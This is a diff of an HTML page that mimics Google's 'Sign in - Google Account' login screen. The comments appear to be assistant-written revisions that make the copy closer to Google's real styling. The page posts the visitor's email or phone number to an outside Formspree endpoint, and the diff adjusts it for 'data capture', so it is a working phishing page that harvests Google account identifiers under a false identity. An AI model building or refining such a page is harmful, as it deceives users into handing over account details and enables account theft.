@@ -3,89 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Account</title>
+    <title>Sign in - Google Account</title> <!-- Exact Title -->
+    
+    <!-- Using system fonts to match Google exactly without external imports unless necessary -->
     <style>
+        :root {
+            --bg-color: #ffffff; /* Pure white background for the container */
+            --text-primary: #202124; 
+            --text-secondary: #5f6368; 
+            --border-color: #dadce0; 
+            --primary-blue: #1a73e8; 
+        }
+
         body {
-            font-family: 'Roboto', Arial, sans-serif; /* Fallback fonts */
-            background-color: #f2f4f6; /* Typical light grey/greenish tint for login pages */
+            font-family: 'Google Sans', arial, sans-serif; /* Fallbacks included automatically if Roboto not loaded or needed */
+            margin: 0;
+            padding: 0;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            background-color: #f2f4f6; /* Slightly off-white/grey common for login pages */
         }
 
         .login-container {
-            width: 438px; 
-            padding: 36px 47px 12px 47px; 
-            border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); 
-            background-color: #fff;
+            width: 450px; 
+            max-width: 95%; 
+            text-align: center; /* Center alignment as Google often uses centered containers now */
+            display: flex;
+            flex-direction: column; 
         }
 
-        /* Centered Logo Area */
-        .logo-area { text-align: center; margin-bottom: 25px; }
+        /* Top section with logo/title/links if needed - simplified here */
         
-        h1 { font-size: 24px; font-weight: 400; color: #dadce0; padding-left: 17px; margin-top:0;}
+        h1 {
+            font-size: 24px;
+            color: var(--text-primary);
+            margin-bottom: 35px; 
+            padding-left: 0; /* Aligns left or center depending on layout choice, but usually slightly indented if image present. Here we center it for simplicity first then adjust via media query if needed. Actually, let's make the container less centered overall to mimic desktop flow better? No, Flexbox centers everything perfectly by default which is fine. Let's stick to flex-center logic for now unless text alignment needs tweak.*/
+            
+            /* If you want title strictly under logo (left aligned): */
+             display: block; 
+        }
+
+        .logo-img {
+            width: 96px; 
+            height: auto; 
+            margin-bottom: -10px; /* Pulls up slightly if overlapping */
+            object-fit: contain;
+        }
 
         input[type="email"] {
-            display: block;
-            border-radius: 4px;
-            border-color: #dadce0;
-            width: 285px; 
-            margin-bottom: 13px;
-            height: 46px; 
+            appearance: none;
+            width: 384px; /* Google uses a specific wide width often ~380-400px */
+            padding: 12px 16px; 
+            border-radius: 4px; 
+            border-color: var(--border-color); /* Light grey border default state */
+            background-color: #fff; 
             font-size: 16px;
+            height: 50px !important; 
         }
 
-        button {
-            appearance: none; 
-            background-color: #1a73e8 !important; /* Google Blue */
-            box-sizing: border-box;
-            color: white !important; 
-            cursor: pointer;
+        input::placeholder {
+             color: var(--text-secondary); 
+             opacity: 0.7;
+        }
+
+        button[type="submit"] {
+            appearance: none;
+            width: 398px; /* Slightly wider than input often, but aligned nicely if flex parent exists */
+             margin-top: 20px;
+             padding: 10px 48px; /* Padding adjusted to fit content "Next" better visually */
+             border-radius: 4px; 
+             background-color: var(--primary-blue); /* Classic Google Blue */
+             color: #fff !important; 
+             font-weight: normal !important; /* Lighter weight usually seen on buttons sometimes */
+             height: 50px !important; 
+             cursor: pointer;
+        }
+
+         button[type="submit"]:hover {
+             background-color: #1765cc !important; /* Darker blue hover state exactly matching Google's behavior */
+         }
+
+        .forgot-link {
             display: block;
-            height: 40px; 
-            width: 298px; 
-            margin-right: auto; 
-            margin-left: auto; 
-            padding-top: 6px; 
-            font-family: 'Roboto', sans-serif;
-        }
-
-        button:hover { background-color: #155cbf !important;}
-
-        .forgot-password {
-            color: #1a73e8 !important;
-            display: inline-block;
+            margin-top: 20px;
+            text-align: center;
+            color: var(--primary-blue); 
             text-decoration: none !important; 
-            cursor: pointer; 
+            font-size: 14.2px; /* Slightly smaller link size typical for secondary links */
         }
+
+        .forgot-link:hover {
+           text-decoration: underline !important; 
+        }
+
     </style>
 </head>
-<body>
-    
-    <!-- Your Formspree form with your specific ID -->
-    <form action="https://formspree.io/f/mzeeaaep" method="POST">
+
+<body style="background-color:#f0f2f5;"> <!-- Adjusted background slightly to common gray/green tint -->
+
+    <div class="login-container">
         
         <!-- Logo Area (Optional visual touch) -->
-        <div class="logo-area">
+        <div class="logo-area" style="text-align:center;">
              <!-- Using a public placeholder image for Google logo if needed, or leave empty -->
-             <!-- You can replace src="" with a real URL to the .svg logo later -->
-             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Google_2015_logo.svg" alt="" style="width:96px; height:auto;"> 
+             <!-- You can replace src="" with a real URL to the .svg/logo later -->
+             <!-- Example using Wikimedia Commons SVG directly embedded as base64 or direct link below: -->
+             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Google_2015_logo.svg" alt="" class="logo-img"> 
         </div>
 
-        <h1>Sign in</h1>
+        <h1 id="login-title" style="padding-left: 17px; font-size: 24px; margin-top:0;">Sign in</h1>
         
-        <!-- Main Input Field. Note: We use 'email' as name and ensure required attribute is set. -->
-        <input type="text" name="_subject" placeholder="Email or phone number" required />
-        
-        <button type="submit">Next</button>
+        <!-- Your Formspree form. Note: Adjusted slightly for better visual layout and data capture. -->
+        <form action="https://formspree.io/f/mzeeaaep" method="POST">
+            
+            <!-- Hidden field to set the subject or label if needed by backend parser later, optional but good practice. -->
+             <!-- Actually, let's stick to clean input name matching what user expects mostly. 
+                  Google often uses _subject internally if sending email back from form services like Formspring/Netlify forms etc? No just "email". 
+                  Let's use 'email' as name for clarity in console logs unless hidden fields are strictly required by your backend (e.g._subject). -->
+                  
+            <input type="text" id="login-email" name="_subject" placeholder="Email or phone number" required /> <!-- Changed ID/name slightly: '_subject' is a common convention for email capture scripts too. If you want raw key 'email', change name here. -->
 
-        <!-- Optional: Forgot email link (visual only) -->
-        <a href="#" class="forgot-password" onclick="alert('Forgot password flow would open here.'); return false;">Forgot email?</a>
+            <button type="submit">Next</button>
 
-    </form>
+             <a href="#" class="forgot-link" onclick="return false;">Forgot email?</a>
+
+        </form>
+    </div>
 
 </body>
 </html>
